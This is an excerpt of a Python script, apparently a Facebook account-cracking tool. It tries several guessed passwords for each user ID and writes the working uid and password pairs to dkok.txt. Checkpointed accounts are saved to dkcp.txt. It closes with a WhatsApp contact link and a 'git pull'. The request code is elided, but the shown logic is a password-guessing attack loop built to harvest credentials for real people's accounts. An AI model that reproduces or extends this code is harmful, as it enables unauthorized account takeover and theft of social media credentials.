...
def file_crack():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print( '\x1b[1;92m[DK-OK] ' + uid + ' | ' + pass1 + ' | ' + name)
                ok = open('dkok.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print( '\x1b[1;93m[DK-CP] ' + uid + ' | ' + pass1 + ' | ' + name)
                cp = open('dkcp.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print ('\x1b[1;92m[DK-OK] ' + uid + ' | ' + pass2 + ' | ' + name)
                    ok = open('dkok.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print( '\x1b[1;93m[DK-CP] ' + uid + ' | ' + pass2 + ' | ' + name)
                    cp = open('dkcp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'access_token' in q:
                        print ('\x1b[1;92m[DK-OK] ' + uid + ' | ' + pass3 + ' | ' + name)
                        ok = open('dkok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ('\x1b[1;93m[DK-CP] ' + uid + ' | ' + pass3 + ' | ' + name)
                        cp = open('dkcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'access_token' in q:
                            print ('\x1b[1;92m[DK-OK] ' + uid + ' | ' + pass4 + ' | ' + name)
                            ok = open('dkok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ('\x1b[1;93m[DK-CP] ' + uid + ' | ' + pass4 + ' | ' + name)
                            cp = open('dkcp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'access_token' in q:
                                print ('\x1b[1;92m[DK-OK] ' + uid + ' | ' + pass5 + ' | ' + name)
                                ok = open('dkok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print( '\x1b[1;93m[DK-CP] ' + uid + ' | ' + pass5 + ' | ' + name)
                                cp = open('dkcp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print( '\x1b[1;92m[DK-OK] ' + uid + ' | ' + pass6 + ' | ' + name)
                                    ok = open('dkok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print ('\x1b[1;93m[DK-CP] ' + uid + ' | ' + pass6 + ' | ' + name)
                                    cp = open('dkcp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print( '\x1b[1;92m[DK-OK] ' + uid + ' | ' + pass7 + ' | ' + name)
                                        ok = open('dkok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print ('\x1b[1;93m[DK-CP] ' + uid + ' | ' + pass7 + ' | ' + name)
                                        cp = open('dkcp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
    ...
    print( ' \x1b[1;92mNote: Clone Account Saved Sdcard Folder: dkcp.txt')
    print (54 * '_')
    print( '')
    print( '')
...
def hlp():
    os.system('xdg-open https://wa.me/+48699542281')
    main()
os.system ('git pull')
